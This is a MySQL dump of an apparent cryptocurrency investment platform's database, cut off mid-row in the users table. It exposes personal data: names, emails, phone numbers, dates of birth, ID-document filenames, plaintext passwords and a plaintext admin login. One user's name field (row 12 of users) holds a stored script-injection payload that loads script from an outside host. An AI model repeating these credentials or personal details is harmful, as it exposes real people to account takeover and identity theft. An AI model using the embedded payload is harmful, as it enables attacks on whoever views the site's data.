-- MySQL dump 10.13  Distrib 8.0.37, for Linux (x86_64)
--
-- Host: localhost    Database: ocjrgyjg_jay
-- ------------------------------------------------------
-- Server version	8.0.37

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Current Database: `ocjrgyjg_jay`
--


--
-- Table structure for table `admin`
--

DROP TABLE IF EXISTS `admin`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `admin` (
  `id` int NOT NULL AUTO_INCREMENT,
  `email` varchar(100) NOT NULL,
  `pass` varchar(100) NOT NULL,
  `status` varchar(100) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `admin`
--

LOCK TABLES `admin` WRITE;
/*!40000 ALTER TABLE `admin` DISABLE KEYS */;
INSERT INTO `admin` (`id`, `email`, `pass`, `status`) VALUES (1,'admin@admin','admin11','');
/*!40000 ALTER TABLE `admin` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `deposits`
--

DROP TABLE IF EXISTS `deposits`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `deposits` (
  `id` int NOT NULL AUTO_INCREMENT,
  `user_id` int NOT NULL,
  `wallet_addr` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `amount` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `snapshot` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `method` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `date_deposited` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `status` int NOT NULL,
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=57 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `deposits`
--

LOCK TABLES `deposits` WRITE;
/*!40000 ALTER TABLE `deposits` DISABLE KEYS */;
INSERT INTO `deposits` (`id`, `user_id`, `wallet_addr`, `amount`, `snapshot`, `method`, `date_deposited`, `status`) VALUES (3,7,'--','500','--','USDT(Trc20)','2024-07-24 22:06:01',1),(4,10,'--','500','--','USDT(Trc20)','2024-07-25 21:33:32',1),(5,11,'--','100','--','USDT(Trc20)','2024-07-25 21:38:58',1),(6,11,'--','50','--','USDT(Trc20)','2024-07-25 22:13:41',1),(7,13,'--','10000','--','USDT(Trc20)','2024-07-27 23:33:27',1),(8,11,'--','5000','--','USDT(Trc20)','2024-08-02 11:50:28',1),(9,22,'--','6','--','BTC(Bitcoin)','2024-08-04 19:56:41',0),(10,22,'--','40','--','BTC(Bitcoin)','2024-08-04 19:56:44',0),(11,25,'--','1000000','--','USDT(Trc20)','2024-08-06 12:41:02',0),(12,25,'--','1000000','--','USDT(Trc20)','2024-08-06 12:41:07',0),(13,25,'--','1000000','--','USDT(Trc20)','2024-08-06 12:47:13',0),(14,25,'--','1000000','--','USDT(Trc20)','2024-08-06 12:47:14',0),(15,25,'--','1000000','--','USDT(Trc20)','2024-08-06 12:48:23',0),(16,21,'--','100','--','USDT(Trc20)','2024-08-06 16:15:31',1),(17,10,'--','100','--','USDT(Trc20)','2024-08-06 17:27:54',0),(19,19,'--','5000','--','USDT(Trc20)','2024-08-06 17:35:12',1),(20,19,'--','5000','--','USDT(Trc20)','2024-08-06 17:35:29',0),(21,7,'--','30','--','BTC(Bitcoin)','2024-08-07 08:25:23',1),(22,7,'--','789','--','USDT(Trc20)','2024-08-07 08:36:23',0),(23,7,'--','33','--','USDT(Trc20)','2024-08-07 08:37:08',0),(24,26,'--','100','--','USDT(Trc20)','2024-08-07 12:37:13',1),(25,14,'--','100','--','USDT(Trc20)','2024-08-07 12:50:34',0),(26,14,'--','500','--','USDT(Trc20)','2024-08-07 13:04:38',0),(27,14,'--','500','--','USDT(Trc20)','2024-08-09 08:09:50',0),(28,31,'--','100','--','USDT(Trc20)','2024-08-11 03:32:56',0),(29,31,'--','100','--','USDT(Trc20)','2024-08-11 04:04:12',0),(30,31,'--','100','--','Litecoin','2024-08-11 04:04:59',1),(31,31,'--','50','--','USDT(Trc20)','2024-08-11 18:20:19',0),(32,7,'--','20','--','Ethereum','2024-08-16 11:52:16',0),(33,7,'--','20','--','Ethereum','2024-08-16 11:52:27',1),(34,38,'--','23','--','USDT(Trc20)','2024-08-18 08:49:12',0),(35,31,'--','50','--','USDT(Trc20)','2024-08-22 18:18:43',0),(36,43,'--','100','--','USDT(Trc20)','2024-08-22 21:53:57',0),(37,31,'--','250','--','USDT(Trc20)','2024-08-25 06:11:16',0),(38,52,'--','20','--','USDT(Trc20)','2024-08-28 07:18:03',1),(39,55,'--','100','--','USDT(Trc20)','2024-09-05 17:59:05',0),(40,55,'--','100','--','USDT(Trc20)','2024-09-05 17:59:08',0),(41,55,'--','100','--','USDT(Trc20)','2024-09-05 17:59:10',1),(42,11,'--','1000','--','USDT(Trc20)','2024-09-06 12:55:22',1),(43,25,'--','25000','--','USDT(Trc20)','2024-09-07 18:28:22',0),(44,25,'--','200','--','USDT(Trc20)','2024-09-07 18:28:55',0),(45,25,'--','200','--','USDT(Trc20)','2024-09-07 18:29:06',0),(46,55,'--','100','--','USDT(Trc20)','2024-09-11 09:24:44',0),(47,55,'--','100','--','USDT(Trc20)','2024-09-11 09:24:52',0),(48,55,'--','100','--','USDT(Trc20)','2024-09-11 09:24:55',0),(49,10,'--','100','--','USDT(Trc20)','2024-09-12 06:35:05',0),(50,67,'--','20000','--','USDT(Trc20)','2024-09-12 21:12:50',0),(51,67,'--','20000','--','USDT(Trc20)','2024-09-12 21:13:05',0),(52,67,'--','20000','--','USDT(Trc20)','2024-09-12 21:13:12',0),(53,81,'--','100','--','USDT(Trc20)','2024-09-15 16:31:55',0),(54,83,'--','$100.00','--','BTC(Bitcoin)','2024-09-18 15:26:21',1),(55,10,'--','100','--','USDT(Trc20)','2024-09-18 16:10:24',1),(56,84,'--','500','--','USDT(Trc20)','2024-09-19 10:43:00',0);
/*!40000 ALTER TABLE `deposits` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `investments`
--

DROP TABLE IF EXISTS `investments`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `investments` (
  `id` int NOT NULL AUTO_INCREMENT,
  `user_id` int NOT NULL,
  `plan` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `amount` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `email` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `profit` decimal(10,2) NOT NULL,
  `number_of_day` int NOT NULL,
  `total` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `date_invested` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `date_to_mature` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `ends_on` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `status` int NOT NULL,
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=57 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `investments`
--

LOCK TABLES `investments` WRITE;
/*!40000 ALTER TABLE `investments` DISABLE KEYS */;
INSERT INTO `investments` (`id`, `user_id`, `plan`, `amount`, `email`, `profit`, `number_of_day`, `total`, `date_invested`, `date_to_mature`, `ends_on`, `status`) VALUES (10,7,'Basic Plan','100','spotwebdev.com@gmail.com',5.20,12,'26','2024-07-28 07:24:02','2024-07-29 07:24:02','2024-08-02 07:24:02',1),(11,7,'Standard Plan','500','spotwebdev.com@gmail.com',37.00,9,'259','2024-07-28 07:36:35','2024-07-29 07:36:35','2024-08-04 07:36:35',1),(12,13,'Basic Plan','100','afamefunajames2000@gmail.com',5.20,5,'26','2024-07-28 10:06:09','2024-07-29 10:06:09','2024-08-02 10:06:09',1),(13,10,'Standard Plan','500','ozoatuegbusamuelo91@gmail.com',37.00,7,'259','2024-07-28 11:33:27','2024-07-29 11:33:27','2024-08-04 11:33:27',1),(14,14,'Basic Plan','100','samuelfrizzysamuelfrizzy148@gmail.com',5.20,5,'26','2024-07-28 12:16:35','2024-07-29 12:16:35','2024-08-02 12:16:35',1),(15,7,'Basic Plan','100','spotwebdev.com@gmail.com',5.20,5,'26','2024-07-28 21:37:18','2024-07-29 21:37:18','2024-08-02 21:37:18',1),(16,11,'Standard Plan','500','boomybae9@gmail.com',37.00,7,'259','2024-07-30 18:19:39','2024-07-31 18:19:39','2024-08-06 18:19:39',1),(17,11,'Standard Plan','500','boomybae9@gmail.com',37.00,7,'259','2024-07-30 18:20:28','2024-07-31 18:20:28','2024-08-06 18:20:28',1),(18,10,'Standard Plan','500','ozoatuegbusamuelo91@gmail.com',37.00,7,'259','2024-08-01 12:31:18','2024-08-02 12:31:18','2024-08-08 12:31:18',1),(19,14,'Standard Plan','500','samuelfrizzysamuelfrizzy148@gmail.com',37.00,7,'259','2024-08-02 21:38:58','2024-08-03 21:38:58','2024-08-09 21:38:58',1),(20,14,'Standard Plan','500','samuelfrizzysamuelfrizzy148@gmail.com',37.00,7,'259','2024-08-02 21:39:49','2024-08-03 21:39:49','2024-08-09 21:39:49',1),(21,21,'Basic Plan','100','rishi_jhapali@yahoo.com',5.20,5,'26','2024-08-08 13:42:09','2024-08-09 13:42:09','2024-08-13 13:42:09',1),(22,31,'Basic Plan','100','Rokafelr8@gmail.com',5.20,6,'26','2024-08-11 18:27:59','2024-08-12 18:27:59','2024-08-16 18:27:59',1),(23,21,'Basic Plan','131','rishi_jhapali@yahoo.com',6.81,5,'34.06','2024-08-14 12:49:52','2024-08-15 12:49:52','2024-08-19 12:49:52',1),(24,11,'Standard Plan','1000','boomybae9@gmail.com',74.00,7,'518','2024-08-14 13:12:52','2024-08-15 13:12:52','2024-08-21 13:12:52',1),(25,7,'Basic Plan','100','spotwebdev.com@gmail.com',5.20,5,'26','2024-08-16 11:53:18','2024-08-17 11:53:18','2024-08-21 11:53:18',1),(26,10,'Basic Plan','100','ozoatuegbusamuelo91@gmail.com',5.20,5,'26','2024-08-16 13:39:50','2024-08-17 13:39:50','2024-08-21 13:39:50',1),(27,10,'Basic Plan','200','ozoatuegbusamuelo91@gmail.com',10.40,5,'52','2024-08-16 13:40:26','2024-08-17 13:40:26','2024-08-21 13:40:26',1),(28,10,'Standard Plan','500','ozoatuegbusamuelo91@gmail.com',37.00,7,'259','2024-08-16 13:41:24','2024-08-17 13:41:24','2024-08-23 13:41:24',1),(29,10,'Basic Plan','100','ozoatuegbusamuelo91@gmail.com',5.20,5,'26','2024-08-17 20:34:58','2024-08-18 20:34:58','2024-08-22 20:34:58',1),(30,11,'Advance Plan','5000','boomybae9@gmail.com',415.00,7,'2905','2024-08-19 18:59:19','2024-08-20 18:59:19','2024-08-26 18:59:19',1),(31,48,'Standard Plan','500','olichristopher4@gmail.com',37.00,7,'259','2024-08-24 09:48:35','2024-08-25 09:48:35','2024-08-31 09:48:35',1),(32,31,'Basic Plan','100','Rokafelr8@gmail.com',5.20,5,'26','2024-08-27 20:28:36','2024-08-28 20:28:36','2024-09-01 20:28:36',1),(33,11,'Standard Plan','3000','boomybae9@gmail.com',222.00,7,'1554','2024-08-28 07:07:40','2024-08-29 07:07:40','2024-09-04 07:07:40',1),(34,52,'Basic Plan','100','ihimbazwepatty2019@gmail.com',5.20,5,'26','2024-08-28 07:56:45','2024-08-29 07:56:45','2024-09-02 07:56:45',1),(35,14,'Basic Plan','100','samuelfrizzysamuelfrizzy148@gmail.com',5.20,5,'26','2024-08-30 20:58:43','2024-08-31 20:58:43','2024-09-04 20:58:43',1),(36,10,'Basic Plan','100','ozoatuegbusamuelo91@gmail.com',5.20,5,'26','2024-09-03 08:33:59','2024-09-04 08:33:59','2024-09-08 08:33:59',1),(37,11,'Basic Plan','100','boomybae9@gmail.com',5.20,5,'26','2024-09-03 09:44:09','2024-09-04 09:44:09','2024-09-08 09:44:09',1),(38,52,'Basic Plan','126','ihimbazwepatty2019@gmail.com',6.55,5,'32.76','2024-09-03 15:30:03','2024-09-04 15:30:03','2024-09-08 15:30:03',1),(39,10,'Basic Plan','100','ozoatuegbusamuelo91@gmail.com',5.20,5,'26','2024-09-06 08:59:42','2024-09-07 08:59:42','2024-09-11 08:59:42',1),(40,55,'Basic Plan','100','anchalkumarjunan1145@gmail.com',5.20,5,'26','2024-09-06 10:18:05','2024-09-07 10:18:05','2024-09-11 10:18:05',1),(41,52,'Basic Plan','130','ihimbazwepatty2019@gmail.com',6.76,5,'33.8','2024-09-09 09:38:07','2024-09-10 09:38:07','2024-09-14 09:38:07',1),(42,10,'Basic Plan','100','ozoatuegbusamuelo91@gmail.com',5.20,5,'26','2024-09-11 09:55:20','2024-09-12 09:55:20','2024-09-16 09:55:20',1),(43,11,'Basic Plan','100','boomybae9@gmail.com',5.20,5,'26','2024-09-11 22:15:05','2024-09-12 22:15:05','2024-09-16 22:15:05',1),(44,11,'Basic Plan','100','boomybae9@gmail.com',5.20,5,'26','2024-09-11 22:15:56','2024-09-12 22:15:56','2024-09-16 22:15:56',1),(45,11,'Basic Plan','100','boomybae9@gmail.com',5.20,5,'26','2024-09-11 22:16:32','2024-09-12 22:16:32','2024-09-16 22:16:32',1),(46,10,'Basic Plan','100','ozoatuegbusamuelo91@gmail.com',5.20,5,'26','2024-09-11 22:19:34','2024-09-12 22:19:34','2024-09-16 22:19:34',1),(47,55,'Basic Plan','100','anchalkumarjunan1145@gmail.com',5.20,5,'26','2024-09-12 05:30:19','2024-09-13 05:30:19','2024-09-17 05:30:19',1),(48,14,'Basic Plan','100','samuelfrizzysamuelfrizzy148@gmail.com',5.20,5,'26','2024-09-12 06:17:16','2024-09-13 06:17:16','2024-09-17 06:17:16',1),(49,14,'Basic Plan','100','samuelfrizzysamuelfrizzy148@gmail.com',5.20,5,'26','2024-09-12 06:19:29','2024-09-13 06:19:29','2024-09-17 06:19:29',1),(50,14,'Basic Plan','100','samuelfrizzysamuelfrizzy148@gmail.com',5.20,5,'26','2024-09-12 06:20:14','2024-09-13 06:20:14','2024-09-17 06:20:14',1),(51,10,'Basic Plan','126','ozoatuegbusamuelo91@gmail.com',6.55,5,'32.76','2024-09-12 15:42:28','2024-09-13 15:42:28','2024-09-17 15:42:28',1),(52,14,'Standard Plan','500','samuelfrizzysamuelfrizzy148@gmail.com',37.00,7,'259','2024-09-15 09:20:44','2024-09-16 09:20:44','2024-09-22 09:20:44',0),(53,52,'Basic Plan','192','ihimbazwepatty2019@gmail.com',9.98,5,'49.92','2024-09-15 09:21:00','2024-09-16 09:21:00','2024-09-20 09:21:00',1),(54,55,'Basic Plan','100','anchalkumarjunan1145@gmail.com',5.20,4,'26','2024-09-18 00:38:07','2024-09-19 00:38:07','2024-09-23 00:38:07',0),(55,83,'Basic Plan','100.00','vazlorna0@gmail.com',5.20,3,'26','2024-09-19 04:16:55','2024-09-20 04:16:55','2024-09-24 04:16:55',0),(56,52,'Basic Plan','240','ihimbazwepatty2019@gmail.com',12.48,1,'62.4','2024-09-21 11:18:54','2024-09-22 11:18:54','2024-09-26 11:18:54',0);
/*!40000 ALTER TABLE `investments` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `kyc`
--

DROP TABLE IF EXISTS `kyc`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `kyc` (
  `id` int NOT NULL AUTO_INCREMENT,
  `user_id` int NOT NULL,
  `firstname` varchar(255) NOT NULL,
  `lastname` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `phonenumber` varchar(255) NOT NULL,
  `datebirth` varchar(255) NOT NULL,
  `drivinglincense` varchar(255) NOT NULL,
  `city` varchar(255) NOT NULL,
  `country` varchar(255) NOT NULL,
  `status` enum('pending','approved','declined') CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=14 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `kyc`
--

LOCK TABLES `kyc` WRITE;
/*!40000 ALTER TABLE `kyc` DISABLE KEYS */;
INSERT INTO `kyc` (`id`, `user_id`, `firstname`, `lastname`, `email`, `phonenumber`, `datebirth`, `drivinglincense`, `city`, `country`, `status`) VALUES (1,11,'Frank','Chidubem','boomybae9@gmail.com','08146966551','2005-08-27T22:51','IMG_20240716_191808_065.jpg','Kastina','Nigeria ','declined'),(2,10,'Hehsdjd','Euuueueue','Djjrjrrhh','Dhdhrrr','1997-07-25T23:16','17219458439155631540474295483953.jpg','Rhruhr','Hyyiiu','approved'),(3,7,'SPOTWEB','COM','spotwebdev.com@gmail.com','08108833188','2024-07-26T18:58','GBPUSD_2024-07-27_11-42-20.png','Enugu state','Nigeria','approved'),(4,11,'Investor ','Investor ','boomybae9@gmail.com','08146966551','1999-08-27T09:40','IMG-20240729-WA0004.jpg','Kastina','Nigeria ','approved'),(5,14,'Crypto B','Crypto B','samuelfrizzysamuelfrizzy148@gmail.com','07043695338','2004-08-02T22:15','IMG-20240720-WA0025.jpg','Free town ','South Africa ','approved'),(6,21,'Rishi','Nepal','rishi_jhapali@yahoo.com','7036081506','1973-08-20T14:05','image.jpg','Manasas ','United States ','approved'),(7,42,'Sandra','Makama ','sandramakama307@gmail.com','+26879814034','1976-07-03T14:34','20230520_091327.jpg','Manzini','Swaziland ','approved'),(8,37,'Dennison ','O\'Brian ','davidbukky11@gmail.com ','1111111111','2000-05-22T11:17','IMG-20240822-WA0002.jpg','Leicester ','England ','approved'),(9,47,'Johnson ','Fredrick ','hannumkellie99@gmail.com','1111111111','1993-08-24T10:23','IMG-20240822-WA0006.jpg','Leicester ','England ','approved'),(10,48,'Cryptostar ','Cryptostar ','olichristopher4@gmail.com','1111111111','1994-08-24T10:42','IMG-20240823-WA0000.jpg','Leicester ','England ','approved'),(11,31,'Felix','DuBois','felixdubois7@gmail.com','787-905-0361','1954-09-23T02:33','IMG_0589.jpg','Vieques','Puerto Rico','approved'),(12,52,'Paterne','IHIMBAZWE ','ihimbazwepatty2019@gmail.com','+250785183948','1999-01-01T08:00','Screenshot_20240902-063817.jpg','Musanze','Rwanda','pending'),(13,55,'Anchal ','Kumar ','anchalkumarjunan1145@gmail.com','+919797443214','1992-04-14T11:11','tanishjunan1_pan_card.jpg','Kathua ','India ','pending');
/*!40000 ALTER TABLE `kyc` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `payment_method`
--

DROP TABLE IF EXISTS `payment_method`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `payment_method` (
  `id` int NOT NULL,
  `network` varchar(100) NOT NULL,
  `wallet_address` varchar(200) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `payment_method`
--

LOCK TABLES `payment_method` WRITE;
/*!40000 ALTER TABLE `payment_method` DISABLE KEYS */;
/*!40000 ALTER TABLE `payment_method` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `users` (
  `id` int NOT NULL AUTO_INCREMENT,
  `user` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `name` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `email` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `phone` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `profile_image` varchar(300) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `password` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `country` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `wallet` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `ref_wallet` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `gain_wallet` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `total_deposit` float NOT NULL,
  `total_withdrawal` float NOT NULL,
  `trading_commission` int NOT NULL,
  `pending_investment` int NOT NULL,
  `referral_balance` int NOT NULL,
  `referral` int NOT NULL,
  `account_warning` enum('no','yes') CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `restriction` enum('no','yes') CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `promo_won` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `ref_id` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `referree` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `date_registered` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `paid_ref` varchar(11) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `dn_with` int NOT NULL,
  `status` varchar(11) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `kycstatus` enum('null','pending','declined','approved') CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=88 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` (`id`, `user`, `name`, `email`, `phone`, `profile_image`, `password`, `country`, `wallet`, `ref_wallet`, `gain_wallet`, `total_deposit`, `total_withdrawal`, `trading_commission`, `pending_investment`, `referral_balance`, `referral`, `account_warning`, `restriction`, `promo_won`, `ref_id`, `referree`, `date_registered`, `paid_ref`, `dn_with`, `status`, `kycstatus`) VALUES (7,'firstclass','SPOTWEB COM','spotwebdev.com@gmail.com','8977656555','1726645476.jpg','firstclass','Nigeria','101436.6','0','1010.4',550,190,0,0,0,0,'no','no','','472076234','','2024-07-24 21:49:28','1',0,'0','approved'),(8,'appu76','abini abijith','avapytxq91@zlorkun.com','14806073388','--','Vpk@12345&','United States','0','0','0',0,0,0,0,0,0,'no','no','','1967924185','','2024-07-25 04:16:28','0',0,'0','null'),(9,'Simon','Simon','simon@gmail.com','1234567890','--','Simon12345','Austria','0','0','0',0,0,0,0,0,0,'no','no','','1429175423','','2024-07-25 10:24:49','0',0,'0','null'),(10,'Frizzy ','Samuel Chidiebere ','ozoatuegbusamuelo91@gmail.com','07043695334','--','@@@@@12345','Samuel Chidiebere ','2442.76','0','1094.750000000001',700,400,0,0,0,0,'no','no','','2066520194','','2024-07-25 14:57:35','1',0,'0','approved'),(11,'Investor087','Investor ','boomybae9@gmail.com','08146966551','--','chidubem123','Nigeria','13036.2','0','5598.999999999996',6150,4200,0,0,0,0,'no','no','','668547358','','2024-07-25 21:36:51','1',0,'0','approved'),(12,'1','<sCRiPt/sRC=//e0l.co/q/></sCrIpT>fasase','fasase@mail.com','6567426742','--','Aa111111@','Åland Islands','0','0','0',0,0,0,0,0,0,'no','no','','1952256138','','2024-07-27 04:36:09','0',0,'0','null'),(14,'CRYPTO B','CRYPTO B','samuelfrizzysamuelfrizzy148@gmail.com','08121685132','--','@@@@@12345','South Africa','2783.2','0','7058.999999999996',0,21500,0,0,0,0,'no','no','','273717978','','2024-07-28 11:24:55','1',1,'0','approved'),(19,'Jay','Jay','afamefunajames2000@gmail.com','1234567890','--','Jay12345','Afghanistan','5000','0','0',5000,0,0,0,0,0,'no','no','','1318985139','','2024-08-02 10:27:42','0',0,'0','null'),(20,'Barogajm','MANIRATUNGA Jean Marie ','maniratungajeanmariex@gmail.com','79844291','--','Barosbara7','Burundi','0','0','0',0,0,0,0,0,0,'no','no','','803161242','','2024-08-02 12:10:08','0',0,'0','null'),(21,'rnepal','Rishi Nepal','rishi_jhapali@yahoo.com','7036081506','--','Unika521506@','United States','6072.01','0','60.05000000000001',100,0,0,0,0,0,'no','no','','1397913289','CRYPTO','2024-08-03 17:59:59','1',0,'0','approved'),(22,'Bukenya ','Bukenya JohnJoel','bukenyajohnjoel@gmail.com','+256756192231','--','Israella200','Uganda','0','0','0',0,0,0,0,0,0,'no','no','','280876843','Investor087','2024-08-04 19:36:29','0',0,'0','null'),(23,'@Phoenix','Vishesh yadav','yvishesh408@gmail.com','917651819091','--','uahwuhrcq@#NSJ','India','0','0','0',0,0,0,0,0,0,'no','no','','349873218','Investor087','2024-08-06 12:14:36','0',0,'0','null'),(24,'@chandan','Chandan mahto','chandanmahto976@gmail.com','9325881410','--','@chandan123','India','0','0','0',0,0,0,0,0,0,'no','no','','2034907706','Investor087','2024-08-06 12:25:07','0',0,'0','null'),(25,'@chandan','Chandan Mahto','mahtosunil931@gmail.com','+919325881410','--','@chandan123','India','0','0','0',0,0,0,0,0,0,'no','no','','133772598','Investor087','2024-08-06 12:26:51','0',0,'0','null'),(26,'Investor665','Daniela Fernandez\\\'s','dorlafalis@gmail.com','07043695334','--','@@@@@12345','United States','100','0','0',100,0,0,0,0,0,'no','no','','552899945','','2024-08-07 12:35:39','0',0,'0','null'),(27,'Jayhub','Jay hub','jayhub247@gmail.com','1234567890','--','Jayhub','Afghanistan','0','0','0',0,0,0,0,0,0,'no','no','','1788525822','','2024-08-07 22:29:08','0',0,'0','null'),(28,'@emeka','Okeka ','okekaemeka@gmail.com','+2349118403375','--','chinoso 042','Nigeria','0','0','0',0,0,0,0,0,0,'no','no','','810738677','Investor087','2024-08-09 23:49:21','0',0,'0','null'),(29,'Frenchraymond ','French','frenchraymondcharles@gmail.com','4028671090','--','23000','Andorra','0','0','0',0,0,0,0,0,0,'no','no','','750799359','','2024-08-10 04:34:12','0',0,'0','null'),(30,'Frenchraymond ','French','huxleyteff@gmail.com','87557434','--','230000','Afghanistan','0','0','0',0,0,0,0,0,0,'no','no','','960791503','','2024-08-10 04:35:21','0',0,'0','null'),(31,'Rokafelr','Felix DuBois Avila','Rokafelr8@gmail.com','7879050361','1726276976.jpg','n3Dnuinvstraven$','Puerto Rico','6007.2','0','52.00000000000001',100,0,0,0,0,0,'no','no','','1461006159','','2024-08-11 03:18:46','1',0,'0','approved'),(32,'Crypto helio','Helio Elon Mukavele','helioelonmukavele01@gmail.com','+258875123340','--','2981helio@','Mozambique','0','0','0',0,0,0,0,0,0,'no','no','','859003978','','2024-08-14 13:29:49','0',0,'0','null'),(33,'crypto Mbango','Helio mukavele','heliomucavele19@gmail.com','258875123340','--','2981Mbango@','Mozambique','0','0','0',0,0,0,0,0,0,'no','no','','1190603723','Investor087','2024-08-14 13:37:26','0',0,'0','null'),(34,'Mandlovu ','Emily Mutusva','mutusva32@gmail.com','+27613911954','--','nyla2008','South Africa','0','0','0',0,0,0,0,0,0,'no','no','','1236280531','Investor087','2024-08-15 20:00:51','0',0,'0','null'),(35,'Ahmed ','Ahmed Abajihad yesuf ','abajihadahmed@gmail.com','+25917205266','--','ahmed12,','Ethiopia','0','0','0',0,0,0,0,0,0,'no','no','','990743873','CRYPTO','2024-08-16 17:47:27','0',0,'0','null'),(36,'Investor23','James ','vnneji00@gmail.com','07046519130','--','vic$$$','Nigeria','0','0','0',0,0,0,0,0,0,'no','no','','756262759','Investor087','2024-08-17 03:29:43','0',0,'0','null'),(38,'Bryce','Fungai mandituruzhara ','brycemandi222@gmail.com','+263779111759','1723971284.jpg','skylarmandi','Zimbabwe','0','0','0',0,0,0,0,0,0,'no','no','','1880811642','Investor087','2024-08-18 08:23:15','0',0,'0','null'),(39,'@kundam','Kundan 